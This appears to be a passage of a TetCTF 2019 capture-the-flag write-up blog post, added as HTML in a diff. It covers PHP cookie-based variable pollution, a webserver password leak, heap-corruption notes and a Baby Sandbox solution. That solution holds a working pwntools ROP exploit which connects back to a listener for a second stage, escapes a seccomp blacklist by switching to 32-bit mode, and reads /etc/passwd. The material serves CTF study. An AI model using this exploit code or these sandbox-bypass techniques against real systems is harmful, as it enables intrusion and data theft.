@@ -1,0 +1,1541 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+   
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="google-site-verification" content="YvLRi76QLISdw5rag4dXqmRRYvw91no7guPZf0-a6FY" />
+    <meta property="og:title" content=" TetCTF 19 &middot;  Protego Totalum Security" />
+    <meta property="og:site_name" content="Protego Totalum Security" />
+    <meta property="og:url" content="https://protegototalum.faith/post/tetctf-19/" />
+
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content="2019-01-01T13:34:45&#43;07:00" />
+    <meta property="og:article:tag" content="CTF" />
+    <meta property="og:article:tag" content="pwn" />
+    <meta property="og:article:tag" content="reversing" />
+    <meta property="og:article:tag" content="TetCTF" />
+    
+
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@flyingpassword" />
+    <meta name="twitter:creator" content="@flyingpassword" />
+    <meta name="twitter:title" content="TetCTF 19" />
+    
+    <meta name="twitter:description" content="Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - Babyfirst  Web 
+IQTest2  After looking at the source code, there is a path that we can polute the $level variable to pass. It has to pass several condition check:  if (isset($_COOKIE[&#39;saved&#39;]) &amp;&amp; !empty($_COOKIE[&#39;saved&#39;]) &amp;&amp; isset($_COOKIE[&#39;hash&#39;]) &amp;&amp; !empty($_COOKIE[&#39;hash&#39;])) { $saved = base64_decode($_COOKIE[&quot;saved&quot;]); $seed = urldecode(substr($saved, 5 )); } if( md5($GLOBALS[&#39;secret&#39;]." />
+    <meta name="twitter:url" content="https://protegototalum.faith/post/tetctf-19/" />
+    
+
+    <title> TetCTF 19 &middot;  Protego Totalum Security</title>
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="preload" href="/js/main.js" as="script" />
+    <link rel="preload" href="/css/main.css" as="style" />
+    
+    
+
+
+    
+    <meta name="description" content="Dig deeper. Try harder. Repeat" />
+    
+
+    
+    <meta name="p:domain_verify" content=""/>
+    
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    
+    
+
+    
+    <link href="https://protegototalum.faith/index.xml" rel="alternate" type="application/rss+xml" title="Protego Totalum Security" />
+    
+
+    
+    <link rel="canonical" href="https://protegototalum.faith/post/tetctf-19/" />
+
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://protegototalum.faith/post/tetctf-19/"
+        },
+        "headline": "TetCTF 19",
+        "description": "",
+        "author": {
+            "@type": "Person",
+            "name": "Duc Phan",
+            "url": "http://profiles.google.com/?rel=author",
+            "image": {
+              "@type": "ImageObject",
+              "url": "https:",
+              "height": 80,
+              "width": 80
+            }
+        },
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://protegototalum.faith/",
+          "name": "Protego Totalum Security",
+          "url": "https://protegototalum.faith/",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https:",
+            "height": 80,
+            "width": 80
+          }
+        },
+        
+        "image": {
+          "@type": "ImageObject",
+          "url": "",
+          "height": 80,
+          "width": 80
+        },
+        "datePublished": "2019-01-01",
+        "dateModified": "2019-01-01",
+        "wordCount": 4145,
+        "keywords": ["CTF","pwn","reversing","TetCTF"] 
+    }
+    </script>
+    
+
+    
+    <script type="text/javascript">
+        
+        
+        var disqus_shortname = 'asimpleguy';
+        var disqus_identifier = 'https:\/\/protegototalum.faith\/post\/tetctf-19\/';
+        var disqus_title = 'TetCTF 19';
+        var disqus_url = 'https:\/\/protegototalum.faith\/post\/tetctf-19\/';
+        
+    </script>
+    
+
+    <script type="text/javascript">
+        var config = {
+            baseUrl: "https:\/\/protegototalum.faith\/"
+        };
+    </script>
+
+    <style>
+html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,figure,footer,header,main,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}a{background-color:transparent;-webkit-text-decoration-skip:objects}img{border-style:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:300;src:local("Merriweather Sans Light"),local(MerriweatherSans-Light),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowY_zIojJi0m4a5Z6tRh6itY.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:400;src:local("Merriweather Sans Regular"),local(MerriweatherSans-Regular),url(//fonts.gstatic.com/s/merriweathersans/v5/AKu1CjQ4qnV8MUltkAX3sL2aU247V0zTzydO4RoO9Ok.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:700;src:local("Merriweather Sans Bold"),local(MerriweatherSans-Bold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowQfd-b-I5PxxcmB4_-MNcqw.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:800;src:local("Merriweather Sans ExtraBold"),local(MerriweatherSans-ExtraBold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowWT7sFQ1Iz1BbpcuCPlgc9Q.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:300;src:local("Merriweather Sans Light Italic"),local(MerriweatherSans-LightItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVX9UU5BmOJGkLxUCVv5VXdc.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:400;src:local("Merriweather Sans Italic"),local(MerriweatherSans-Italic),url(//fonts.gstatic.com/s/merriweathersans/v5/3Mz4hOHzs2npRMG3B1ascf0KIgDhPIHb_R-SWdtqte8.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:700;src:local("Merriweather Sans Bold Italic"),local(MerriweatherSans-BoldItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVYM8pfYvjMoOxygpzLVILAs.woff) format("woff")}@font-face {font-family: 'Aldrich';font-style: normal;font-weight: 400;src: local('Aldrich Regular'), local('Aldrich-Regular'), url('//fonts.gstatic.com/s/aldrich/v8/j-NnyokbAnhXANS2iZ6Jew.woff2') format('woff2');unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;font-style:normal}[class^="icon-"]:before{font-family:"icons";font-style:normal;font-weight:400;speak:none;display:inline-block;text-decoration:inherit;width:1em;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-arrow-right:before{content:'\e807'}.icon-rss:before{content:'\e808'}body{font:300 1em / 1.5em 'Merriweather Sans',sans-serif;color:#595B66}a{color:inherit;text-decoration:none;font-weight:400}h1,h2{text-rendering:optimizeLegibility;color:#1F2026}h2 a{font-weight:inherit}h1{font-size:2em;line-height:1em;margin:2em 0 -.5em}h2{font-size:1.75em;line-height:1.143em;margin:2.286em 0 -.571em}p{margin:2em auto}i{font-weight:400;font-style:italic;color:#363740}img{display:block;max-width:100%;height:auto;margin:2.5em auto}body{background:#fff}.inner{max-width:48em;margin:0 auto;padding:0 1em}#wrapper{position:relative;box-sizing:border-box;width:100%;min-height:100vh;padding-bottom:6em;background:#F2F3F5}#push{transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav{position:relative;background:#fff;z-index:70;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav:after{clear:both;content:'';display:table}#nav .nav-logo{float:left;height:2em;padding:1em;max-width:50%}#nav .nav-logo img{width:auto;max-width:none;height:2em;margin:0;border-radius:5px}#nav .nav-menu{float:right}#nav .nav-menu:after{clear:both;content:'';display:table}#nav .nav-menu a{display:block;width:1em;height:1em;line-height:1em;padding:1.5em;text-align:center;float:left}#nav .nav-menu a i:before{margin:auto}.overlay{display:none;position:fixed;left:0;top:0;width:100%;height:100%;z-index:80;display:none}.overlay:before{content:'';position:absolute;left:0;top:0;width:100%;height:100%;background:#1F2026;opacity:0;transform-style:preserve-3d}#header{position:relative;padding:4em 0}#header .inner{position:relative;z-index:2}#header .header-title{display:block;text-align:center}#header .header-name{font-family: Aldrich, sans-serif;font-weight:700;letter-spacing:-1px;display:block;line-height:1em;font-size:2em;text-decoration:none;color:#1F2026;padding:0;margin:0}#header.has-cover .header-name{color:#fff}#header .header-description{display:block;margin:1em auto 0;color:#9D9FA6;position:relative;font-weight:300}#header .header-description:after{content:'';position:absolute;height:1px;width:100px;margin-left:-50px;left:50%;top:-.5em;background:#D4D5D9}#header.has-cover .header-description{color:#fff}#header.has-cover .header-description:after{background:#fff}#header .header-cover{position:absolute;width:100%;height:100%;top:0;left:0;margin-top:-4em;padding:4em 0;background:no-repeat fixed center 100% / cover;z-index:1}#header .header-cover:before{content:'';position:absolute;width:100%;height:100%;left:0;top:0;background:rgba(0,0,0,0.2)}#header .header-cover:after{content:'';position:absolute;width:100%;left:0;bottom:0;border-bottom:4px solid #19A0D7}#footer{position:absolute;width:100%;left:0;bottom:0;font-size:.75em;line-height:1.334em;background:#1F2026;color:#737580;z-index:20;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#footer a{color:#9D9FA6;font-weight:400}#footer .credits{text-align:center;font-size:.75em;line-height:1.334em;padding:2.667em;overflow:auto}#footer .credits span{display:block}#footer .credits .credits-theme{float:left}#footer .credits .credits-software{float:right}.post{position:relative;z-index:20}.post .post-image{display:block;margin:0;padding:0}.post .post-image img{display:block;width:100%;height:auto;margin:0;padding:0}.post .post-meta{display:block;font-size:.75em;line-height:1.334em;font-weight:400;margin-bottom:1.334em}.post .post-title{position:relative;color:#000;font-size:2em;line-height:1.375em;font-weight:800;text-indent:-1px;margin:.25em 0 .75em}.post .post-title:before{content:'';position:absolute;left:0;bottom:-.334em;width:1em;margin-bottom:-2px;border-bottom:4px solid #19A0D7}.post .post-title a{text-decoration:none;color:inherit;font-weight:inherit}#post-index{position:relative;max-width:1200px;margin:0 auto 4em;padding:.5em;z-index:10}@keyframes fade{0%{transform:translate3d(0,3em,0);opacity:0}100%{transform:translate3d(0,0,0);opacity:1}}.post-list{position:relative}.post-list .post{float:left;width:33.3%;transform:translate3d(0,3em,0);transform-style:preserve-3d;opacity:0;animation:fade ease-out .5s forwards;animation-delay:1.4s}@media only screen and (max-width: 50em){.post-list .post{width:49.9%}}@media only screen and (max-width: 30em){.post-list .post{width:100%;float:none}}.post-list .post:nth-child(1){animation-delay:.1s}.post-list .post:nth-child(2){animation-delay:.2s}.post-list .post:nth-child(3){animation-delay:.3s}.post-list .post:nth-child(4){animation-delay:.4s}.post-list .post:nth-child(5){animation-delay:.5s}.post-list .post:nth-child(6){animation-delay:.6s}.post-list .post:nth-child(7){animation-delay:.7s}.post-list .post:nth-child(8){animation-delay:.8s}.post-list .post:nth-child(9){animation-delay:.9s}.post-list .post .inner{word-wrap:break-word;padding:2em;margin:.5em;max-width:none;background:#fff;box-sizing:border-box;transform:scale(1);transform-style:preserve-3d}@media only screen and (max-width: 50em){.post-list .post .inner{padding:1em}}.post-list .post .post-link{position:absolute;left:0;top:0;width:100%;height:100%;z-index:10}.post-list .post .post-image{position:relative;margin:-2em -2em 0;overflow:hidden;background:#19A0D7}@media only screen and (max-width: 50em){.post-list .post .post-image{margin:-1em -1em 0}}.post-list .post .post-image img{transform:scale(1);transform-style:preserve-3d;opacity:1}.post-list .post .post-image:after{content:'';position:absolute;left:-5%;bottom:-2.5em;width:110%;height:4em;background:#fff;border-top:4px solid #19A0D7;box-shadow:0 0 2em rgba(0,0,0,0.2);transform:rotate(5deg)}.post-list .post .post-title{font-size:1.5em;line-height:1.167em}.post-list .post .post-excerpt{margin:0}.post-list .post .post-more{display:block;margin-top:1.5em}.post-list .post .post-more a{display:inline-block;font-size:.875em;line-height:1.143em;font-weight:400;color:#363740}.post-list .post .post-more a i{color:#0e77a0}.pagination{min-height:3em;margin:4em auto 2em;padding:0;position:relative}.pagination .pagination-item{position:relative;display:block;height:3em;line-height:3em;padding:0 1em;text-align:center;text-decoration:none;font-weight:700;color:#363740;border:1px solid #19A0D7;border-radius:4em;z-index:60}.pagination .pagination-item i{position:relative}@media only screen and (max-width: 30em){.pagination .pagination-item{width:4em;height:4em;line-height:4em;margin-top:-.5em;padding:0!important}.pagination .pagination-item i{font-size:1.5em}.pagination .pagination-item>span{display:none}}.pagination .pagination-prev{float:right}.pagination .pagination-prev i{right:-.05em}.pagination .pagination-info{display:block;left:0;top:0;height:3em;line-height:3em;position:absolute;text-align:center;width:100%;z-index:50;color:#9D9FA6}#loader-wrapper{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000}#loader{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;border:3px solid transparent;border-top-color:#19A0D7;animation:spin 2s linear infinite}#loader:before{content:"";position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:3px solid transparent;border-top-color:#0e77a0;animation:spin 3s linear infinite}#loader:after{content:"";position:absolute;top:15px;left:15px;right:15px;bottom:15px;border-radius:50%;border:3px solid transparent;border-top-color:#D4D5D9;animation:spin 1.5s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-119018152-2"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-119018152-2');
+    </script>
+
+</head>
+
+
+<body class="home-template">
+<div id="loader-wrapper">
+    <div id="loader"></div>
+</div>
+<section id="wrapper" style="display: none;">
+    <div id="ajax-container">
+        <nav id="nav" class="nav">
+            <div class="nav-logo">
+                <a href="https://protegototalum.faith/">
+                    
+                    Protego Totalum Security
+                    
+                </a>
+            </div>
+            <div id="main-menu" class="nav-menu">
+                
+                
+                    <a class="nav-social" target="_blank" href="https://twitter.com/flyingpassword" title="Protego Totalum Security on Twitter"><i class="fa fa-twitter"></i></a>
+                
+                
+                    <a class="nav-social" target="_blank" href="https://linkedin.com/in/ducphanduy" title="Protego Totalum Security on LinkedIn"><i class="fa fa-linkedin"></i></a>
+                
+                
+                <a class="nav-social" target="_blank" href="https://github.com/ducphanduyagentp" title="Protego Totalum Security on GitHub"><i class="fa fa-github"></i></a>
+                
+                <a id="search-button" onclick="$('#search-form').toggle();" title="Search"><i class="fa fa-search"></i></a>
+                <form id="search-form" method="get" role="search" action="https://google.com/search">
+                    <input type="hidden" name="as_sitesearch" value="https://protegototalum.faith/">
+                    <input type="text" name="q" maxlength="255" placeholder="Search..." class="form-control">
+                    <input type="submit" value="Search">
+                </form>
+                
+                
+                
+                
+                <a id="main-menu-button" class="menu" data-action="menu" data-target="menu"
+                   title="Main Menu"><i class="fa fa-navicon"></i></a>
+                
+            </div>
+        </nav>
+
+
+<main class="content" role="main">
+    <article class="post">
+        <div class="inner">
+
+            <div id="push">
+
+                <header class="post-header">
+                
+                    <span class="post-meta">
+                        <span class="post-date">1 Jan 2019</span> <span class="reading-time">| <span class="estimated-reading-time">20 min.</span> (<span class="word-count">4145</span> words)</span></span>
+                    </span>
+                <div class="clear"></div>
+                
+                <h1 class="post-title">TetCTF 19</h1>
+              </header>
+
+              <section class="post-content">
+                
+                  
+
+<ul>
+<li><a href="#TetCTF-IQTest2">Web - IQTest2 (unsolved)</a></li>
+<li><a href="#TetCTF-webserver">Pwn - Easy webserver (unsolved)</a></li>
+<li><a href="#TetCTF-babysandbox">Pwn - Babysandbox</a></li>
+<li><a href="#TetCTF-babyheap">Pwn - Babyheap</a></li>
+<li><a href="#TetCTF-babyfirst">Pwn - Babyfirst</a></li>
+</ul>
+
+<h1 id="web">Web</h1>
+
+<p><a name="TetCTF-IQTest2"></a></p>
+
+<h2 id="iqtest2">IQTest2</h2>
+
+<ul>
+<li>After looking at the source code, there is a path that we can polute the <code>$level</code> variable to pass. It has to pass several condition check:</li>
+</ul>
+
+<pre><code class="language-php">if (isset($_COOKIE['saved']) &amp;&amp; !empty($_COOKIE['saved']) &amp;&amp; isset($_COOKIE['hash']) &amp;&amp; !empty($_COOKIE['hash']))
+{
+  $saved = base64_decode($_COOKIE[&quot;saved&quot;]);
+  $seed = urldecode(substr($saved, 5 ));
+}
+
+if( md5($GLOBALS['secret'].$seed) === $_COOKIE['hash'] )
+{    
+  $level = $GLOBALS[&quot;seed_key&quot;][$seed];
+  if ($level === NULL)
+  {
+    $saved = &quot;level=i&amp;&quot;.$saved;
+    $exp = explode(&quot;&amp;&quot;, $saved);
+    foreach($exp as $value)
+    {
+      parse_str($value);
+    }
+  }
+  ...
+}
+</code></pre>
+
+<ul>
+<li>For this to work:
+
+<ul>
+<li><code>$saved</code> gotta be <code>level=xiii</code> or something similar</li>
+<li><code>$seed</code> must not match any valid seed so <code>$level</code> is null</li>
+<li>So previously <code>$saved</code> is <code>b64encode(&quot;level=xiii&quot;)</code> and so <code>$seed</code> is <code>=xiii</code></li>
+<li>Which means <code>md5($GLOBAL['secret'].&quot;=xiii&quot;) === $_COOKIE['hash']</code></li>
+</ul></li>
+
+<li><p>But we also knows pairs of hashes/part of plaintext is the seed.</p>
+
+<pre><code>f783148cc4750250969e3e1a0336aa43, c2VlZD10cnVl
+997ca87069e58013ee1f499c348b686b, c2VlZD10c3U=
+d81384d795a9f245b7b9081b70fd6dba, c2VlZD1iMG5n
+dde85171daaf2508d5bb2ec2d0a2859e, c2VlZD1sMHYz
+a42bb0f900169d78df68390bb4ce4690, c2VlZD1saXZl
+e530da3436a296a64c95851ba57e22b3, c2VlZD1odWh1
+b6f2505760fa81a262458eca297072db, c2VlZD1nZWdl
+
+f783148cc4750250969e3e1a0336aa43
+997ca87069e58013ee1f499c348b686b
+d81384d795a9f245b7b9081b70fd6dba
+dde85171daaf2508d5bb2ec2d0a2859e
+a42bb0f900169d78df68390bb4ce4690
+e530da3436a296a64c95851ba57e22b3
+b6f2505760fa81a262458eca297072db
+</code></pre></li>
+</ul>
+
+<h1 id="pwn">Pwn</h1>
+
+<p><a name="TetCTF-webserver"></a></p>
+
+<h2 id="easy-webserver">Easy webserver</h2>
+
+<ul>
+<li>This is a webserver written in C/C++. It has several functionalities at the first glance
+
+<ul>
+<li>login</li>
+<li>describe the challenge</li>
+<li>download server-side code and binary</li>
+<li>Process requests to the additional endpoints:
+
+<ul>
+<li>/secret</li>
+<li>/login</li>
+<li>/info</li>
+<li>/chung96vn</li>
+</ul></li>
+<li>Some handle POST requests as well</li>
+</ul></li>
+<li>This binary is complex because of C++ but I figured out that it uses asio library</li>
+<li>Examining strings reveals responses to the requests. I was able to leak the admin password by sending a wrong password of length 0x100. Somehow this input is placed right before the actual admin password and the server echo the wrong password back, therefore leaking the admin password.</li>
+<li>Logging in reveal more functionalities
+
+<ul>
+<li>Submit a payload of (what seems like) an arbitrary length. The payload is placed in a file in <code>info/&lt;ip&gt;/&lt;ip&gt;.txt</code></li>
+<li>GET request to the /info entry read the file and responds with it. However, this endpoint checks if the <code>ip</code> GET param starts with the IP address of the request. If it doesn&rsquo;t, the request is disregarded.</li>
+</ul></li>
+<li>Tracing the binary and threads I was able to see what&rsquo;s passed into the functions and syscalls. It uses some like stat, openat. Attempt to do path traversal was not successful.</li>
+<li>Maybe this is a race condition because it open files and write to it? What if we write different stuffs to the file multiple times in a short duration.</li>
+<li>Yeah there was a race, but I&rsquo;m not sure where to go from here.</li>
+<li>Maybe the param to /info is read into a global buffer and it wasn&rsquo;t lock properly. So we can somehow cause a race to make the server open <code>secret/flag</code> while checking some path that starts with our IP?</li>
+</ul>
+
+<p><a name="TetCTF-babysandbox"></a></p>
+
+<h2 id="baby-sandbox">Baby Sandbox</h2>
+
+<ul>
+<li>The program is just a simple stack buffer overflow. 64-bit, only NX so we can probably ROP. It&rsquo;s also statically linked so there is likely to be enough gadgets.</li>
+<li>The sandbox has all protections on.</li>
+<li>The following syscalls are filtered:
+
+<ul>
+<li>59: sys_execve</li>
+<li>322: stub_execveat</li>
+<li>2 with flag: sys_open</li>
+<li>257 with flag: sys_openat</li>
+<li>304 with flag: sys_open_by_handle_at</li>
+<li>57: sys_fork</li>
+<li>58: sys_vfork</li>
+<li>56: sys_clone</li>
+<li>86: sys_link</li>
+<li>0xb: munmap in x64 and execve in x86</li>
+</ul></li>
+<li>I ended up building a super dirty ROP chain to read more payload from another connection. That&rsquo;s the hardest part because of the limited payload length. After that, it&rsquo;s easy to make fixed memory segments executable and execute shellcode on that.</li>
+<li>The interesting sandbox bypassing techniques I&rsquo;ve learned while researching for this challenge:
+
+<ul>
+<li>Change the architecture so the syscall number is different and won&rsquo;t be blacklisted.</li>
+<li>Kill the parent process</li>
+<li>Fork itself</li>
+</ul></li>
+</ul>
+
+<pre><code class="language-python">from __future__ import print_function
+from pwn import *
+import os
+
+GDBSCRIPT = &quot;&quot;&quot;
+b * 0x400bcb
+&quot;&quot;&quot;
+HOST = 'sandbox.chung96vn.cf'
+PORT = 1337
+BIN = './program'
+#LIBC = './libc.so.6'
+addrs = {
+    'pushrsp': 0x450523,
+    'poprax': 0x4150d4,
+    'poprdi': 0x400686,
+    'subraxrdi': 0x4405b8,
+    'pushraxpoprbx': 0x488025,
+    'pushrbx': 0x44ad4f,
+    'poprdxpoprsi': 0x44b879,
+    'syscall': 0x4748a5,
+    'mprotect': 0x44a0c0,
+    'ret': 0x400bcb,
+    'poprsitordi': 0x446a5b,
+    'poprsi': 0x4100d3,
+    'addeax1': 0x474301,
+    'poprsp': 0x401d53,
+    'poprsi': 0x4100d3,
+    'poprdx': 0x44b856,
+    'adddhbl': 0x40058e,
+    'syscallpoprdxpoprsi': 0x44b877,
+    'movrsirbxsyscall': 0x047f52f
+}
+
+base = 0x6b6000
+
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    e = ELF(BIN)
+    r = process([&quot;./sandbox&quot;, e.path]) #, env={'LD_PRELOAD': LIBC})
+
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
+
+def pivotstack():
+    # mprotect 0x1000 bytes starting at 0x6bc3f0
+    payload = &quot;&quot;
+#    payload += p64(addrs['poprdxpoprsi'])
+#    payload += p64(0x7)
+#    payload += p64(0x1000)
+    payload += p64(addrs['poprdi'])
+    payload += p64(base)
+#    payload += p64(addrs['mprotect'])
+    
+    # pop struct sockaddr_in
+    payload += p64(addrs['poprsi'])
+    payload += p64(0x0100007f5c110002)
+#    payload += p64(0x221fce125c110002)
+    payload += p64(addrs['poprsitordi'])
+
+    # open socket
+    payload += p64(addrs['poprax'])
+    payload += p64(0x29)
+    payload += p64(addrs['poprdxpoprsi'])
+    payload += p64(0)
+    payload += p64(1)
+    payload += p64(addrs['poprdi'])
+    payload += p64(2)
+    payload += p64(addrs['syscallpoprdxpoprsi'])       
+    
+    # connect
+    payload += p64(0x10)
+    payload += p64(base)
+    payload += p64(addrs['poprdi'])
+    payload += p64(0)
+    payload += p64(addrs['poprax'])
+    payload += p64(0x2a)
+    payload += p64(addrs['syscall'])
+
+    # read
+    payload += p64(addrs['poprdx'])
+    payload += p64(0x600)
+    payload += p64(addrs['syscall']) 
+
+    # pivot
+    payload += p64(addrs['poprsp'])
+    payload += p64(base)
+
+    return payload
+
+
+def realropchain():
+    payload = &quot;&quot;
+    
+    # Test write
+    payload += p64(addrs['poprax'])
+    payload += p64(1)
+    payload += p64(addrs['poprdx'])
+    payload += p64(0x50)
+    payload += p64(addrs['syscall'])
+
+    # mprotect 0x1000 bytes starting at 0x6bc3f0
+    payload = &quot;&quot;
+    payload += p64(addrs['poprdxpoprsi'])
+    payload += p64(0x7)
+    payload += p64(0x600)
+    payload += p64(addrs['poprdi'])
+    payload += p64(base)
+    payload += p64(addrs['poprax'])
+    payload += p64(10)
+    payload += p64(addrs['syscall'])
+
+    payload += p64(base + 0x50)
+    payload += '\x90' * 8
+
+    print(context.arch)
+    context.arch = 'amd64'
+    sc64 = &quot;&quot;&quot;
+    mov DWORD PTR [rsp + 4], 0x23
+    mov DWORD PTR [rsp], {}
+    retf
+    &quot;&quot;&quot;.format(base + 0x100)
+
+    payload += asm(sc64)
+    payload = payload.ljust(0x100, '\x90')
+    
+    context.clear()
+    sc32 = &quot;&quot;&quot;
+    mov eax, 63
+    mov ebx, 1
+    xor ecx, ecx
+    int 0x80
+    mov eax, 63
+    mov ebx, 2
+    xor ecx, ecx
+    int 0x80
+    &quot;&quot;&quot;
+    payload += asm(sc32)
+    payload += asm(shellcraft.i386.linux.readfile('/etc/passwd', 0))
+    #payload += asm(shellcraft.sh())
+    payload = payload.ljust(0x300, '\x90')
+    # Read map file
+#    payload = &quot;&quot;
+#    payload += p64(addrs['poprax'])
+#    payload += p64(39)
+#    payload += p64(addrs['syscall'])
+#
+#    payload += p64(addrs['pushraxpoprbx'])
+#    payload += p64(addrs['poprdi'])
+#    payload += p64(0x6bc700)
+#    payload += p64(addrs['movrsirbxsyscall'])
+    return payload
+
+def main():
+    l = listen(4444)
+    payload = 'A' * (8 * 7)
+    ropchain = pivotstack()
+    payload += ropchain
+    print(&quot;len payload = {}&quot;.format(len(payload)))
+    raw_input('pwn?')
+    r.sendline(payload)
+
+    payload = realropchain()
+    print(&quot;len payload 2 = {}&quot;.format(len(payload)))
+    l.sendline(payload)
+
+    #l.interactive()
+    r.interactive()
+    r.close()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<p><a name="TetCTF-babyheap"></a></p>
+
+<h2 id="babyheap">Babyheap</h2>
+
+<ul>
+<li>This is a typical heap challenge interface with a jump table:
+
+<ul>
+<li>alloc</li>
+<li>edit</li>
+<li>delete</li>
+<li>show</li>
+</ul></li>
+<li>Alloc:
+
+<ul>
+<li>Doesn&rsquo;t prompt for a size.</li>
+<li>Also doesn&rsquo;t have canary (strange&hellip;)</li>
+<li>Alloc fixed size of 0x98 and store in a global array, max 6 chunks</li>
+</ul></li>
+<li>Edit:</li>
+<li>Delete:
+
+<ul>
+<li>Free then set 0 at the global array</li>
+</ul></li>
+<li>Show:
+
+<ul>
+<li>Magic: %ld</li>
+<li>Content: %s</li>
+</ul></li>
+
+<li><p>The size of the allocated memory is exactly the sum of the member sizes. When using scanf, the last newline byte will be replaced with a null byte, results in 1-byte overflow into the next chunk&rsquo;s size.</p></li>
+
+<li><p>This is glibc 2.23 so we can use the main_arena leak:</p>
+
+<ul>
+<li>Allocate 2 chunks.</li>
+<li>Free the first chunk then allocate again.</li>
+<li>Show the first chunk and the address of <code>main_arena</code> will be shown.</li>
+</ul></li>
+
+<li><p>The first idea I&rsquo;ve got about the one-byte overflow is to first allocate some chunks of the same size, and then free 2 in the between, then modify the marginal chunks to overwrite the header of the freed chunks so when we allocate again, <code>malloc</code> will return a different pointer than we usually expect.</p></li>
+
+<li><p>Something can probably be done based on the &ldquo;shrinking free chunks&rdquo; attack. But since the malloc size is fixed here, to get larger freed chunks, we can allocate and free 2 consecutive chunks so they coalesce.</p></li>
+
+<li><p>To bypass the <code>p-&gt;next-&gt;prevsize == p-&gt;size</code> check, we need to add fake <code>prevsize</code> to the chunk in between before freeing it.</p></li>
+
+<li><p>Real size is 0xa0</p></li>
+
+<li><p>Heap can be leaked by allocating at least 3 chunks and free 2 non-consecutives so the fd and bk in each are populated. Then allocate the chunk again and dump it.</p></li>
+
+<li><p>Need to allocate 5 chunks so when freeing 3, top chunk is not coalesced</p></li>
+
+<li><p>Need to fix fd and bk of chunk 1 to manipulate the unlink</p></li>
+
+<li><p>whatever in the fd and bk will be put onto the unsorted bin after the unlink. Then the thing in it will be returned in the next malloc
+fd + 8 * 4 == fd -&gt; bk == P
+bk + 8 * 3 == bk -&gt; fd == P
+fd -&gt; bk = bk
+bk -&gt; fd = fd</p></li>
+
+<li><p>Layout:</p>
+
+<pre><code class="language-python">0x000:  Chunk 0
+0x0a0:  Chunk 1
+0x140:  Chunk 2
+0x1e0:  Chunk 3
+0x280:  Chunk 4
+0x320:  Chunk 5
+Need 0x1a0 to be 0x100 to be persistent with Chunk 1's size
+malloc_hook malloc_hook + 8
+main_arena  main_arena + 8
+</code></pre></li>
+
+<li><p>I&rsquo;ve just figured out that we can corrupt the prev_size of the next chunk as well, in addition to the first byte of the size to be 0.</p>
+
+<ul>
+<li>Shrink size of the free chunk or current chunk.</li>
+</ul></li>
+
+<li><p>Oh man I&rsquo;ve just figured out, too, that it&rsquo;s not an off-by-one but off by many wtf.</p></li>
+
+<li><p>Okay here&rsquo;s a new approach</p>
+
+<ul>
+<li>alloc 0 1 2</li>
+<li>make fake chunk inside 1 ==&gt; 0 | 1 corrupted | fake chunk(s)</li>
+<li>corrupt size of 1 using 0</li>
+<li>free 1</li>
+<li>Corrupt size to make 1 a fast chunk?? Then make more fast chunks to turn this into a fastbin attack?</li>
+</ul></li>
+
+<li><p>So the idea is to eventually make a chunk of 2 different size appear in the unsorted bin so when 1 get allocated, the other still in the free list and we can manipulate it to create a fake chunk inside and then get it to return a desired pointer.</p></li>
+
+<li><p>SO here&rsquo;s another approach</p>
+
+<ul>
